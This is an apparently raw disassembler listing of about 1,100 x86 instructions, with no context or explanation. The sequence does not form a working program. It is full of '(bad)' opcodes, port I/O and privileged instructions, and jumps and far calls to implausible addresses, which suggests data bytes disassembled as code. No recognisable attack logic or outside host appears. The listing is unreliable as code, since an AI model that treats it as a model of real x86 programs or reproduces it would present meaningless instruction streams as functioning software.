  419abe:	and    ecx,DWORD PTR [ebp+0x62]
  419ac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ac2:	adc    al,0x38
  419ac4:	test   ecx,edi
  419ac6:	pop    ss
  419ac7:	push   ecx
  419ac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ac9:	out    0x7b,eax
  419acb:	test   BYTE PTR [eax+0x6f],ch
  419ace:	(bad)  
  419acf:	cld    
  419ad0:	aad    0xe2
  419ad2:	sahf   
  419ad3:	lods   al,BYTE PTR ds:[esi]
  419ad4:	pop    ss
  419ad5:	inc    edi
  419ad6:	xor    al,0x89
  419ad8:	test   al,0x4
  419ada:	dec    ebx
  419adb:	mov    dl,0x69
  419add:	sar    DWORD PTR [di+0x53],0x48
  419ae2:	add    ebx,eax
  419ae4:	rcl    BYTE PTR [ebp+0x34],1
  419ae7:	test   eax,0xb437258b
  419aec:	das    
  419aed:	xor    al,0x17
  419aef:	repz mov ecx,0x2bff02a8
  419af5:	xor    al,0x58
  419af7:	inc    esi
  419af8:	dec    ebp
  419af9:	adc    cl,BYTE PTR [ebx-0xc]
  419afc:	loop   0x419b45
  419afe:	sahf   
  419aff:	(bad)  [ecx-0x44272f38]
  419b05:	sbb    BYTE PTR [ecx],al
  419b07:	pop    ss
  419b08:	repnz cmp al,0x22
  419b0b:	fld    DWORD PTR [edi+ecx*8+0x7f656e2b]
  419b12:	es out dx,al
  419b14:	mov    DWORD PTR [ebx-0x2fe86b04],edx
  419b1a:	fmul   QWORD PTR [ebp+0x2b9d1eed]
  419b20:	je     0x419ade
  419b22:	outs   dx,DWORD PTR ds:[esi]
  419b23:	jecxz  0x419b3d
  419b25:	stos   DWORD PTR es:[edi],eax
  419b26:	add    DWORD PTR [esi],eax
  419b28:	fs jge 0x419b52
  419b2b:	add    ebx,DWORD PTR [esi+0x46]
  419b2e:	push   ecx
  419b2f:	out    dx,al
  419b30:	ins    BYTE PTR es:[edi],dx
  419b31:	pusha  
  419b32:	aad    0xa4
  419b34:	xchg   DWORD PTR [eax-0x1b8a6792],edi
  419b3a:	in     eax,0xa3
  419b3c:	push   edx
  419b3d:	mov    esp,0xb1ca43a
  419b42:	and    bl,BYTE PTR [ebp+0x2e6d91cd]
  419b48:	mov    BYTE PTR [eax+0x75],cl
  419b4b:	retf   
  419b4c:	imul   ecx,esi,0xb99d2cd
  419b52:	jmp    0x419b83
  419b54:	add    al,0x5d
  419b56:	mov    esp,0x9dbf5f44
  419b5b:	jo     0x419af7
  419b5d:	and    al,0x84
  419b5f:	mov    dl,0x55
  419b61:	cmp    edx,esi
  419b63:	push   edi
  419b64:	sbb    DWORD PTR [eax+ebp*1],edi
  419b67:	clc    
  419b68:	pop    ecx
  419b69:	ret    
  419b6a:	mov    ecx,DWORD PTR [ebp+0x6f]
  419b6d:	test   DWORD PTR fs:[edx-0x5d299952],ecx
  419b74:	push   esp
  419b75:	jae    0x419b56
  419b77:	fidivr WORD PTR [esi-0x708ced8a]
  419b7d:	sbb    ah,BYTE PTR [ebx-0x7c]
  419b80:	jo     0x419b1e
  419b82:	(bad)  
  419b83:	out    0x7b,eax
  419b85:	sub    edx,DWORD PTR [ebx+eiz*8+0x2a]
  419b89:	gs retf 
  419b8b:	fbstp  TBYTE PTR [esi-0x7acb64be]
  419b91:	fild   QWORD PTR ds:0xe0283d65
  419b97:	cmp    BYTE PTR [ebp+0x15],dh
  419b9a:	push   es
  419b9b:	xchg   BYTE PTR [ecx],dl
  419b9d:	inc    ebx
  419b9e:	dec    edi
  419b9f:	pop    esi
  419ba0:	pushf  
  419ba1:	aad    0xfa
  419ba3:	pop    ss
  419ba4:	leave  
  419ba5:	sbb    eax,0xbfd1b2c7
  419baa:	adc    al,0xac
  419bac:	sub    al,0x7d
  419bae:	pop    edi
  419baf:	stos   BYTE PTR es:[edi],al
  419bb0:	call   DWORD PTR [eax]
  419bb2:	xchg   edi,eax
  419bb3:	push   esi
  419bb4:	fidivr WORD PTR [edx]
  419bb6:	jnp    0x419bf8
  419bb8:	cs ins DWORD PTR es:[edi],dx
  419bba:	push   ecx
  419bbb:	dec    edx
  419bbc:	and    ebp,DWORD PTR [esi+0xa43544e]
  419bc2:	test   al,ah
  419bc4:	jb     0x419b57
  419bc6:	(bad)  
  419bc7:	sub    al,0x33
  419bc9:	add    ecx,DWORD PTR ds:0xfb456c5
  419bcf:	shl    edx,0x12
  419bd2:	sub    eax,0xf05939a2
  419bd7:	sub    eax,0xdbea7341
  419bdc:	cdq    
  419bdd:	cmp    al,0x7c
  419bdf:	jmp    0x419ba4
  419be1:	sub    al,0x34
  419be3:	lods   eax,DWORD PTR ds:[esi]
  419be4:	xchg   edx,eax
  419be5:	sub    BYTE PTR [edx-0x7a],0x79
  419be9:	mov    ecx,0x996eba07
  419bee:	add    DWORD PTR [ecx],eax
  419bf0:	adc    ch,BYTE PTR [edx-0x46]
  419bf3:	aas    
  419bf4:	jmp    0x99e75824
  419bf9:	mov    dh,0xb
  419bfb:	mov    al,BYTE PTR [eax+eax*1+0x47]
  419bff:	fwait
  419c00:	call   0xb99631cb
  419c05:	retf   0x660b
  419c08:	push   esi
  419c09:	xor    DWORD PTR [edx+ebx*2],ebp
  419c0c:	push   sp
  419c0e:	and    al,0xb8
  419c10:	outs   dx,BYTE PTR ds:[esi]
  419c11:	push   0xffffffad
  419c13:	dec    esi
  419c14:	je     0x419c28
  419c16:	lods   al,BYTE PTR ds:[esi]
  419c17:	sbb    cl,BYTE PTR [esi*8+0x587d9710]
  419c1e:	jne    0x419bee
  419c20:	xchg   ecx,eax
  419c21:	mov    ds:0x15b058e3,al
  419c26:	out    dx,al
  419c27:	dec    edx
  419c28:	pop    edi
  419c29:	pop    esp
  419c2a:	fwait
  419c2b:	sbb    dl,al
  419c2d:	add    BYTE PTR [eax+0x6],al
  419c30:	retf   0x61cf
  419c33:	vminss xmm5,xmm1,DWORD PTR [eax+0x41]
  419c38:	mov    ebp,es
  419c3a:	rcr    BYTE PTR [edi-0x17],1
  419c3d:	fdivr  QWORD PTR [ebx-0x3f]
  419c40:	or     bl,BYTE PTR [ebx]
  419c42:	jns    0x419c0a
  419c44:	jp     0x419be1
  419c46:	xchg   esp,eax
  419c47:	div    BYTE PTR [eax+0x2afca2e1]
  419c4d:	loope  0x419c03
  419c4f:	les    esp,FWORD PTR [eax]
  419c51:	icebp  
  419c52:	into   
  419c53:	or     DWORD PTR [edi-0x7e],eax
  419c56:	push   ebx
  419c57:	pop    es
  419c58:	dec    esp
  419c59:	or     eax,DWORD PTR [ebx+eiz*1]
  419c5c:	and    dh,BYTE PTR [esi+0x57]
  419c5f:	cld    
  419c60:	mov    eax,ds:0xb8a533f8
  419c65:	and    BYTE PTR [edx],cl
  419c67:	loopne 0x419c4d
  419c69:	push   es
  419c6a:	jnp    0x419cce
  419c6c:	jecxz  0x419ced
  419c6e:	ins    BYTE PTR es:[edi],dx
  419c6f:	inc    ecx
  419c70:	jb     0x419c00
  419c72:	pusha  
  419c73:	sub    BYTE PTR [edi+0x55],0x7b
  419c77:	mov    es,WORD PTR [eax+0x64]
  419c7a:	adc    al,0xa6
  419c7c:	lahf   
  419c7d:	sub    bh,BYTE PTR [edx]
  419c7f:	fnstcw WORD PTR [eax-0x2a]
  419c82:	mov    bl,0x75
  419c84:	lods   al,BYTE PTR ds:[esi]
  419c85:	inc    ebx
  419c86:	push   esi
  419c87:	je     0x419ca7
  419c89:	enter  0x4475,0x3a
  419c8d:	jns    0x419ce9
  419c8f:	jne    0x419cba
  419c91:	icebp  
  419c92:	div    BYTE PTR [ecx]
  419c94:	push   ebp
  419c95:	push   ecx
  419c96:	dec    eax
  419c97:	mov    DWORD PTR [edx-0x32773340],esi
  419c9d:	xchg   ebp,eax
  419c9e:	pop    ebp
  419c9f:	mov    eax,ds:0xf19f792e
  419ca4:	mov    edx,0xcdc97358
  419ca9:	xchg   edi,eax
  419caa:	ins    BYTE PTR es:[edi],dx
  419cab:	push   ebp
  419cac:	or     ch,BYTE PTR [ebx+0x6e78913c]
  419cb2:	sub    ecx,DWORD PTR [edi+0x4085cf6b]
  419cb8:	sub    DWORD PTR [ebp-0x3d10ba7c],ebp
  419cbe:	dec    ebx
  419cbf:	(bad)  
  419cc0:	dec    edi
  419cc1:	inc    ebp
  419cc2:	inc    esp
  419cc3:	xor    dh,bh
  419cc5:	mov    DWORD PTR [ebp*4+0x12f3e2f2],esp
  419ccc:	add    BYTE PTR [esi-0x29297520],al
  419cd2:	inc    ebp
  419cd3:	dec    eax
  419cd4:	test   BYTE PTR [ecx+0x38],bl
  419cd7:	repz js 0x419d28
  419cda:	jmp    0xbec596cd
  419cdf:	repz shr BYTE PTR [edi],1
  419ce2:	xor    edx,DWORD PTR [ebx-0x2a]
  419ce5:	adc    BYTE PTR [eax],al
  419ce7:	out    0xa2,eax
  419ce9:	jmp    0x419d3c
  419ceb:	dec    esp
  419cec:	nop
  419ced:	cmp    DWORD PTR [edx+0x2ec474db],ebp
  419cf3:	add    al,0xca
  419cf5:	gs (bad) 
  419cf7:	scas   al,BYTE PTR es:[edi]
  419cf8:	xchg   edx,eax
  419cf9:	adc    eax,0xe93b4e21
  419cfe:	sbb    al,0xb7
  419d00:	sahf   
  419d01:	test   DWORD PTR [esi-0x6d7c3658],edx
  419d07:	fld    DWORD PTR [ecx-0x74]
  419d0a:	ins    BYTE PTR es:[edi],dx
  419d0b:	loop   0x419d01
  419d0d:	or     edi,DWORD PTR [edx+edx*4+0x61c1c5fd]
  419d14:	cdq    
  419d15:	int3   
  419d16:	mov    edx,0x24c9f3d4
  419d1b:	fstp   st(2)
  419d1d:	cmp    DWORD PTR [eax-0x7f58c69d],0x5e
  419d24:	call   0xd014:0xf9a0c05e
  419d2b:	shl    cl,0x84
  419d2e:	push   ebp
  419d2f:	and    BYTE PTR [edx+edi*2],al
  419d32:	stc    
  419d33:	stc    
  419d34:	push   ebp
  419d35:	cmc    
  419d36:	inc    edx
  419d37:	fcmove st,st(7)
  419d39:	les    esp,FWORD PTR [ebx]
  419d3b:	out    dx,eax
  419d3c:	jno    0x419d43
  419d3e:	or     eax,0x16629ada
  419d43:	cmp    ebp,edx
  419d45:	shr    ecx,cl
  419d47:	lea    ebp,[eax+ebx*8]
  419d4a:	fucom  st(7)
  419d4c:	jae    0x419d0c
  419d4e:	call   0x6e6d5042
  419d53:	fbstp  TBYTE PTR [eax+edi*4-0xe]
  419d57:	addr16 fwait
  419d59:	cwde   
  419d5a:	sub    ebx,DWORD PTR [edi]
  419d5c:	bound  edx,QWORD PTR ds:0x327908ff
  419d62:	and    DWORD PTR [eax+esi*4+0x61],ebx
  419d66:	fs pop edi
  419d68:	clc    
  419d69:	or     esi,edi
  419d6b:	cwde   
  419d6c:	dec    esi
  419d6d:	sbb    BYTE PTR [eax-0x53],ah
  419d70:	js     0x419da4
  419d72:	xchg   esp,eax
  419d73:	(bad)  
  419d74:	xor    ch,BYTE PTR [esi]
  419d76:	in     eax,dx
  419d77:	mov    edi,0x4879cd36
  419d7c:	js     0x419d1b
  419d7e:	ins    BYTE PTR es:[edi],dx
  419d7f:	rcl    edx,cl
  419d81:	aad    0x3e
  419d83:	jmp    0x419d55
  419d85:	sub    ecx,edx
  419d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d88:	sub    eax,0x4dc966c0
  419d8d:	jne    0x419d39
  419d8f:	fadd   st(5),st
  419d91:	cli    
  419d92:	scas   al,BYTE PTR es:[edi]
  419d93:	mov    esp,0x676ace87
  419d98:	repnz cmp eax,0x18f9aa12
  419d9e:	pusha  
  419d9f:	push   ebx
  419da0:	dec    ebx
  419da1:	xor    eax,0x4c13003a
  419da6:	mov    dh,0x34
  419da8:	push   0xd857a5de
  419dad:	adc    eax,0xc857db4a
  419db2:	xor    eax,0x7342d701
  419db7:	xor    al,0xb2
  419db9:	inc    ebp
  419dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dbb:	int3   
  419dbc:	dec    eax
  419dbd:	or     al,0xa3
  419dbf:	adc    DWORD PTR [ebp+edx*1+0x6973372f],esp
  419dc6:	mov    ds:0xf39add14,al
  419dcb:	addr16 cdq 
  419dcd:	test   dh,dh
  419dcf:	sub    BYTE PTR [eax+0x7a75273],bh
  419dd5:	and    dl,0x67
  419dd8:	jno    0x419d83
  419dda:	xchg   edx,eax
  419ddb:	ror    DWORD PTR [ecx],cl
  419ddd:	aas    
  419dde:	int    0x1
  419de0:	lea    eax,[eax+edi*8+0x17de6dc2]
  419de7:	call   0xb7cd0a79
  419dec:	inc    ecx
  419ded:	loopne 0x419e20
  419def:	mov    cs,WORD PTR [edx]
  419df1:	inc    ebx
  419df2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419df3:	dec    ecx
  419df4:	jmp    0x419e36
  419df6:	cld    
  419df7:	mov    dh,0x81
  419df9:	rcr    DWORD PTR [ebx+esi*1],cl
  419dfc:	rcr    BYTE PTR [ebx+0x47f4de65],0xed
  419e03:	adc    BYTE PTR [edx+0x37466a4a],bl
  419e09:	ins    BYTE PTR es:[edi],dx
  419e0a:	ret    
  419e0b:	(bad)  
  419e0c:	mov    ds:0x16d5c2fd,eax
  419e11:	stc    
  419e12:	mov    ebp,0xdfa54169
  419e17:	jb     0x419e2d
  419e19:	leave  
  419e1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e1b:	ret    0xe5eb
  419e1e:	or     ebx,DWORD PTR [ebx+eiz*4-0x4b]
  419e22:	or     edx,eax
  419e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e25:	push   ecx
  419e26:	or     edx,DWORD PTR [ecx]
  419e28:	sahf   
  419e29:	sysret 
  419e2b:	int    0x1b
  419e2d:	mov    ecx,0x9ce2e120
  419e32:	dec    esp
  419e33:	add    eax,0x266494af
  419e38:	push   edi
  419e39:	mov    cs,WORD PTR ds:0x32cb4e0e
  419e3f:	repnz or eax,0xf51932f8
  419e45:	out    0x16,eax
  419e47:	pop    ebp
  419e48:	test   DWORD PTR [ebx],ebp
  419e4a:	sbb    al,0x34
  419e4c:	mov    dh,dl
  419e4e:	(bad)  
  419e4f:	neg    WORD PTR [edi]
  419e52:	arpl   WORD PTR [ebx+0x2e],bx
  419e55:	(bad)  
  419e56:	push   esp
  419e57:	out    0xd7,al
  419e59:	addr16 cld 
  419e5b:	loop   0x419e01
  419e5d:	pop    ebx
  419e5e:	xchg   ebp,eax
  419e5f:	inc    ecx
  419e60:	or     eax,0x16366b5d
  419e65:	xchg   ecx,eax
  419e66:	neg    BYTE PTR [ecx+0x18]
  419e69:	(bad)  
  419e6a:	sub    al,0xdb
  419e6c:	cld    
  419e6d:	push   0xa47e663
  419e72:	and    edx,DWORD PTR [edx]
  419e74:	daa    
  419e75:	push   esi
  419e76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e77:	inc    ebp
  419e78:	fisubr WORD PTR [esi]
  419e7a:	out    dx,eax
  419e7b:	push   0xe5c45233
  419e80:	sub    esp,DWORD PTR [ebp-0x74]
  419e83:	clc    
  419e84:	and    eax,0xef6674b6
  419e89:	es xchg ebx,eax
  419e8b:	fcmovb st,st(6)
  419e8d:	scas   eax,DWORD PTR es:[edi]
  419e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e8f:	arpl   WORD PTR [edi+0x12f5f401],si
  419e95:	or     al,bh
  419e97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e98:	add    DWORD PTR [ecx],edi
  419e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e9b:	ins    DWORD PTR es:[edi],dx
  419e9c:	dec    ecx
  419e9d:	xor    BYTE PTR [edi],ch
  419e9f:	pushf  
  419ea0:	aad    0x23
  419ea2:	call   0xb4ac:0xd3f63613
  419ea9:	sahf   
  419eaa:	test   BYTE PTR [eax-0x2667136b],0x57
  419eb1:	int3   
  419eb2:	fstp   TBYTE PTR [ecx-0x11fc3b28]
  419eb8:	sbb    al,0x3e
  419eba:	and    eax,0x30e5ee0
  419ebf:	mov    esi,0x302da685
  419ec4:	loopne 0x419e95
  419ec6:	imul   ecx,ebp,0xdd8ae774
  419ecc:	in     eax,0xc8
  419ece:	push   ds
  419ecf:	das    
  419ed0:	pop    ds
  419ed1:	jno    0x419e8d
  419ed3:	rcl    BYTE PTR [ebx-0x2876a7c],1
  419ed9:	push   ecx
  419eda:	sbb    DWORD PTR [ecx],eax
  419edc:	popa   
  419edd:	mov    ebx,0xa2d541f3
  419ee2:	jmp    0x515551ba
  419ee7:	adc    ebx,eax
  419ee9:	in     al,dx
  419eea:	or     BYTE PTR [edi+0x7c],0xeb
  419eee:	or     al,0x28
  419ef0:	das    
  419ef1:	dec    ebp
  419ef2:	inc    esp
  419ef3:	and    DWORD PTR [ebx+0x14],edi
  419ef6:	jne    0x419f40
  419ef8:	outs   dx,DWORD PTR ds:[esi]
  419ef9:	add    DWORD PTR [esi-0x47186178],ebp
  419eff:	mov    eax,fs
  419f01:	imul   eax,DWORD PTR [edi-0x21895a1d],0x52
  419f08:	inc    BYTE PTR [ebx+0x1e]
  419f0b:	push   0x2b
  419f0d:	xor    ecx,ecx
  419f0f:	pop    eax
  419f10:	daa    
  419f11:	fidivr DWORD PTR [ebx+0x24]
  419f14:	jb     0x419f36
  419f16:	(bad)  
  419f17:	(bad)  
  419f18:	jno    0x419f77
  419f1a:	lds    esp,FWORD PTR [ebp-0xf4975e]
  419f20:	dec    eax
  419f21:	pop    edx
  419f22:	fcmovne st,st(6)
  419f24:	popa   
  419f25:	jmp    0x419f35
  419f27:	gs mov ebp,0x49d5d377
  419f2d:	sub    eax,0x9db7445e
  419f32:	test   DWORD PTR [esi+0x63],ebx
  419f35:	fsub   QWORD PTR [esi]
  419f37:	xchg   esp,eax
  419f38:	mov    DWORD PTR [edi+0x69],edx
  419f3b:	mov    eax,ds:0xfaa5446d
  419f40:	sbb    DWORD PTR [eiz*4-0x60e46750],eax
  419f47:	and    eax,0xbc7ce833
  419f4c:	xor    BYTE PTR [edx],dl
  419f4e:	mov    eax,ds:0x2aa57190
  419f53:	sub    eax,0x75cd187
  419f58:	xchg   edx,eax
  419f59:	inc    esi
  419f5a:	mov    ds:0x879d7c40,al
  419f5f:	fcom   DWORD PTR [edx-0x5e45ef85]
  419f65:	addr16 mov bl,0xb6
  419f68:	push   esi
  419f69:	popf   
  419f6a:	inc    ebx
  419f6b:	pop    es
  419f6c:	fwait
  419f6d:	test   al,0xb4
  419f6f:	mov    eax,ds:0x17c7d34d
  419f74:	adc    BYTE PTR [ecx-0x69],0xd6
  419f78:	scas   eax,DWORD PTR es:[edi]
  419f79:	mov    al,ds:0xa68a083e
  419f7e:	aas    
  419f7f:	clc    
  419f80:	enter  0x6e2f,0xa2
  419f84:	or     esp,ecx
  419f86:	add    eax,0x5c7d9377
  419f8b:	cmp    al,dh
  419f8d:	daa    
  419f8e:	mov    esi,0x6472e93d
  419f93:	int    0x94
  419f95:	push   ds
  419f96:	lea    eax,[esi-0x2fd434b3]
  419f9c:	rcr    BYTE PTR [edx],cl
  419f9e:	dec    ecx
  419f9f:	jg     0x419f3d
  419fa1:	and    ebp,esp
  419fa3:	dec    ecx
  419fa4:	sub    eax,0xef736593
  419fa9:	inc    edx
  419faa:	repz loopne 0x419f92
  419fad:	cmp    ch,BYTE PTR [esi-0x7e]
  419fb0:	enter  0xd4d4,0xa0
  419fb4:	jp     0x419f93
  419fb6:	scas   al,BYTE PTR es:[edi]
  419fb7:	shl    BYTE PTR [ebx],cl
  419fb9:	mov    dh,0x55
  419fbb:	mov    ah,0x74
  419fbd:	add    edi,esi
  419fbf:	out    0x1,eax
  419fc1:	arpl   ax,si
  419fc3:	retf   
  419fc4:	leave  
  419fc5:	fmul   st,st(3)
  419fc7:	push   ebp
  419fc8:	leave  
  419fc9:	mov    ebp,0x7464175e
  419fce:	fstp   TBYTE PTR [esi+0xf]
  419fd1:	mov    cx,si
  419fd4:	(bad)  
  419fd5:	xchg   esp,eax
  419fd6:	jle    0x41a019
  419fd8:	xor    DWORD PTR [edi+0x1f],edx
  419fdb:	mov    ds:0x840f63fc,al
  419fe0:	sbb    cl,BYTE PTR [eax-0x60]
  419fe3:	in     al,dx
  419fe4:	(bad)  
  419fe5:	mov    ecx,0x67845180
  419fea:	jo     0x419f8b
  419fec:	jne    0x419f8f
  419fee:	iret   
  419fef:	loopne 0x419fba
  419ff1:	ret    0x2e77
  419ff4:	add    al,0x33
  419ff6:	dec    ecx
  419ff7:	in     al,0x41
  419ff9:	imul   edi,DWORD PTR [eax-0x4ff6070b],0x5b
  41a000:	dec    edi
  41a001:	jg     0x419f9a
  41a003:	xor    eax,0x99c8ddca
  41a008:	test   BYTE PTR [eax-0x88efe5f],dh
  41a00e:	push   ds
  41a00f:	mov    al,0xf0
  41a011:	ficom  WORD PTR [esi-0x12369391]
  41a017:	pusha  
  41a018:	xor    esi,DWORD PTR [edi]
  41a01a:	xchg   esi,eax
  41a01b:	mov    ch,0x2f
  41a01d:	(bad)  
  41a01e:	and    eax,DWORD PTR [eax]
  41a020:	data16 scas al,BYTE PTR es:[edi]
  41a022:	pop    es
  41a023:	fsub   DWORD PTR ds:0x4d820e56
  41a029:	sub    al,0xc
  41a02b:	test   eax,0xfff944b4
  41a030:	loop   0x41a0ae
  41a032:	add    eax,DWORD PTR [eax-0xf]
  41a035:	jl     0x41a0aa
  41a037:	cld    
  41a038:	push   ecx
  41a039:	das    
  41a03a:	ret    0x5567
  41a03d:	ds enter 0x931c,0xa0
  41a042:	sbb    DWORD PTR [ebx-0x7],ebx
  41a045:	fld    TBYTE PTR cs:[eax+0x671ef043]
  41a04c:	(bad)  [esi+0x32]
  41a04f:	mov    eax,esi
  41a051:	mov    ch,0xdd
  41a053:	dec    eax
  41a054:	das    
  41a055:	stos   BYTE PTR es:[edi],al
  41a056:	xchg   edx,eax
  41a057:	pop    eax
  41a058:	fisub  WORD PTR [esi-0x36e351d3]
  41a05e:	pop    eax
  41a05f:	pop    ebp
  41a060:	xor    esi,DWORD PTR [esi+0x21]
  41a063:	mov    esi,esp
  41a065:	inc    esp
  41a066:	mov    edx,DWORD PTR [edi+0x1b272eb7]
  41a06c:	jns    0x41a04c
  41a06e:	pusha  
  41a06f:	and    eax,eax
  41a071:	rcl    DWORD PTR cs:[edx],1
  41a074:	push   ebx
  41a075:	xchg   esi,eax
  41a076:	fs mov al,0xfc
  41a079:	ret    
  41a07a:	out    dx,al
  41a07b:	loope  0x41a068
  41a07d:	std    
  41a07e:	pusha  
  41a07f:	(bad)  
  41a080:	arpl   WORD PTR [ebx],dx
  41a082:	and    ecx,DWORD PTR [esi]
  41a084:	mov    dh,0x75
  41a086:	or     BYTE PTR [esi-0x37],bh
  41a089:	int    0x1
  41a08b:	jae    0x41a094
  41a08d:	sbb    esi,DWORD PTR [edi+esi*8]
  41a090:	mov    bl,0x5f
  41a092:	cmp    al,0xc6
  41a094:	cmp    al,BYTE PTR [edx]
  41a096:	jns    0x41a0ec
  41a098:	ss adc edx,esp
  41a09b:	popa   
  41a09c:	inc    ebx
  41a09d:	(bad)  
  41a09e:	fcomp  QWORD PTR [eax]
  41a0a0:	out    0x8c,al
  41a0a2:	js     0x41a0ae
  41a0a4:	and    BYTE PTR [ecx+esi*8+0x5c],cl
  41a0a8:	rcpps  xmm7,XMMWORD PTR [edi+0x5e4e0138]
  41a0af:	idiv   ecx
  41a0b1:	xchg   BYTE PTR ds:0xa7150ebc,dl
  41a0b7:	mov    cl,0x12
  41a0b9:	iret   
  41a0ba:	std    
  41a0bb:	mov    ds:0x43e4cf6a,al
  41a0c0:	add    DWORD PTR [ebx+0x3f],esp
  41a0c3:	jbe    0x41a0fd
  41a0c5:	push   0xd9698261
  41a0ca:	cwde   
  41a0cb:	out    dx,al
  41a0cc:	ins    BYTE PTR es:[edi],dx
  41a0cd:	mov    ebp,0x532334d8
  41a0d2:	mov    dl,0xf7
  41a0d4:	bound  esi,QWORD PTR [edx+0x32]
  41a0d7:	dec    edi
  41a0d8:	jnp    0x41a0e6
  41a0da:	add    al,0xb0
  41a0dc:	adc    BYTE PTR [ecx-0x4a],dl
  41a0df:	xor    DWORD PTR [edx-0x4fb607de],esp
  41a0e5:	lods   eax,DWORD PTR ds:[esi]
  41a0e6:	sbb    BYTE PTR [eax+ebx*4],bl
  41a0e9:	pop    ebp
  41a0ea:	ins    BYTE PTR es:[edi],dx
  41a0eb:	sbb    eax,0x7ed8403f
  41a0f0:	add    eax,ecx
  41a0f2:	loope  0x41a0b5
  41a0f4:	inc    ecx
  41a0f5:	cmp    eax,0x5666fb4e
  41a0fa:	aaa    
  41a0fb:	pop    esp
  41a0fc:	lds    ebp,FWORD PTR [ebx+ecx*1-0x2a]
  41a100:	stc    
  41a101:	xor    DWORD PTR [esp+ecx*4],esi
  41a104:	repnz adc al,BYTE PTR [eax-0x7]
  41a108:	pusha  
  41a109:	fisub  DWORD PTR [ebx]
  41a10b:	mov    ds,WORD PTR [edx-0x32f259fd]
  41a111:	mov    BYTE PTR [ebp-0x5d53b48c],cl
  41a117:	dec    ebp
  41a118:	pop    edx
  41a119:	mov    ds:0x6ab7d2a,al
  41a11e:	add    al,0x67
  41a120:	dec    BYTE PTR [ecx-0x8]
  41a123:	mov    dl,0x38
  41a125:	jl     0x41a104
  41a127:	pop    ebp
  41a128:	mov    ah,0xd0
  41a12a:	loopne 0x41a0eb
  41a12c:	mov    WORD PTR [ecx+0x612d306d],ds
  41a132:	push   ds
  41a133:	add    ebp,DWORD PTR [ebp+edi*8+0x6a]
  41a137:	xchg   esi,eax
  41a138:	sbb    eax,0xdc7888f9
  41a13d:	add    eax,0x30f9d099
  41a142:	mov    edi,0x1c12e52
  41a147:	xchg   ecx,eax
  41a148:	ss loopne 0x41a16c
  41a14b:	inc    esi
  41a14c:	les    ebp,FWORD PTR [edi+0x48a019bf]
  41a152:	sub    BYTE PTR [esi],dl
  41a154:	fstp   DWORD PTR [edi+0x61]
  41a157:	cli    
  41a158:	jp     0x41a0fd
  41a15a:	shl    BYTE PTR [eax+edi*2],1
  41a15d:	jo     0x41a11d
  41a15f:	cmp    al,0xb1
  41a162:	mov    esi,0x3ca3edba
  41a167:	or     BYTE PTR [esi],ah
  41a169:	fisttp DWORD PTR [edi-0x3c]
  41a16c:	(bad)  
  41a16d:	xchg   edx,eax
  41a16e:	inc    esi
  41a16f:	sbb    al,0xbf
  41a171:	push   0xffffffac
  41a173:	mov    WORD PTR ds:0x535b5aa5,gs
  41a179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a17a:	(bad)  
  41a17c:	sti    
  41a17d:	in     al,dx
  41a17e:	push   esi
  41a17f:	clc    
  41a180:	and    BYTE PTR [edi+0x37],0xe4
  41a184:	jmp    0x9d11:0xaa7c2b4a
  41a18b:	cli    
  41a18c:	pop    ebp
  41a18d:	jnp    0x41a198
  41a18f:	push   ebp
  41a190:	repnz sub eax,0xd6fdecd8
  41a196:	nop
  41a197:	scas   al,BYTE PTR es:[edi]
  41a198:	sbb    esp,esp
  41a19a:	lods   eax,DWORD PTR ds:[esi]
  41a19b:	popa   
  41a19c:	cmc    
  41a19d:	add    DWORD PTR [edx-0x6],0x8dcf23f6
  41a1a4:	gs sub eax,0x21f2eebf
  41a1aa:	add    BYTE PTR [ecx],dh
  41a1ac:	jecxz  0x41a1ef
  41a1ae:	mov    edx,0x2e40b259
  41a1b3:	add    al,0x17
  41a1b5:	cli    
  41a1b6:	sub    al,0x5c
  41a1b8:	sub    al,0xe1
  41a1ba:	push   edx
  41a1bb:	mov    ch,0x14
  41a1bd:	xchg   DWORD PTR [edi+0x3a],ecx
  41a1c0:	mov    ds:0x36e61e8b,eax
  41a1c5:	in     eax,0x55
  41a1c7:	jo     0x41a156
  41a1c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1ca:	xchg   BYTE PTR [edx*1-0x3193bd34],cl
  41a1d1:	std    
  41a1d2:	add    al,0xea
  41a1d4:	add    DWORD PTR [eax+ebp*1-0x6c856566],esi
  41a1db:	push   cs
  41a1dc:	mov    eax,0x728a87d5
  41a1e1:	div    DWORD PTR [ecx+0x2a]
  41a1e4:	(bad)  
  41a1e5:	jmp    0x41a217
  41a1e7:	mov    al,0x63
  41a1e9:	jmp    FWORD PTR [ecx]
  41a1eb:	cwde   
  41a1ec:	push   0xf
  41a1ee:	sub    ebx,DWORD PTR [eax]
  41a1f0:	jmp    0x2d3c5fb2
  41a1f5:	xor    BYTE PTR [eax+0x1f76f2bc],0x6c
  41a1fc:	in     eax,dx
  41a1fd:	jae    0x41a201
  41a1ff:	lea    ebx,[ebx+0x25]
  41a202:	mov    bh,0xd3
  41a204:	call   0xb048d9cf
  41a209:	push   ds
  41a20a:	fistp  DWORD PTR [eax]
  41a20c:	adc    bl,BYTE PTR [esi]
  41a20e:	imul   ebx,DWORD PTR [ecx],0x1c
  41a211:	add    DWORD PTR [edi+0x29],eax
  41a214:	jb     0x41a265
  41a216:	jp     0x41a1c5
  41a218:	loop   0x41a1d7
  41a21a:	inc    ecx
  41a21b:	jbe    0x41a271
  41a21d:	shl    BYTE PTR [edi],1
  41a21f:	pop    ebx
  41a220:	fimul  WORD PTR [edi-0x23d3ccd3]
  41a226:	jns    0x41a1db
  41a228:	popa   
  41a229:	js     0x41a26b
  41a22b:	mov    ch,0xbb
  41a22d:	jnp    0x41a28c
  41a22f:	in     al,0xee
  41a231:	push   esi
  41a232:	data16 sbb al,0xe7
  41a235:	popa   
  41a236:	sbb    BYTE PTR [ecx],al
